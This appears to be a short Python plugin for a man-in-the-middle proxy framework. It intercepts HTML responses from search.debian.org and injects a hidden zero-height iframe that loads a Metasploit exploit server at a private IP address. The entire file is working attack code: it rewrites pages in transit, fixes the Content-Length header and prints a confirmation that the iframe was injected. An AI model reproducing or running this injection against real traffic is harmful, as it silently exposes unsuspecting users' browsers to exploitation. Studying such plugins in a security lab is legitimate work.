#!/usr/bin/python
import urllib2
import re
#from BeautifulSoup import BeautifulSoup
import libmiddler.api.header as header

### CHANGE AS NEEDED
request_match = (("Host","search.debian.org"),)
response_match = (("Content-type","TEXT/HTML"),)
code1 = '''<iframe height=0 src="http://172.16.175.134:8000/metasploit"></iframe>'''

### FUNCTION TO MANIPULATE CLIENT REQUEST
def doRequest(session, request_header, data):
  changed = 0
  stop = 0
  return(request_header, data, changed, stop)



### FUNCTION TO MANIPULATE SERVER RESPONSE
def doResponse(session, request_header, response_header, data):
  changed = 0
  stop = 0

  ### DETERMINE IF WE NEED TO CHANGE DATA
  if header.headertest(request_header, request_match) & header.headertest(response_header, response_match):

    ### MANIPULATE DATA - INSERT SCRIPT
    data = re.sub('</body>', code1 + '</body>', data)
    changed = 1
    print("Metasploit iframe injected")

  ### RETURN DATA
  if changed:
    header.headerfix(response_header, "Content-Length", str(len(data)))

  return(response_header, data, changed, stop)
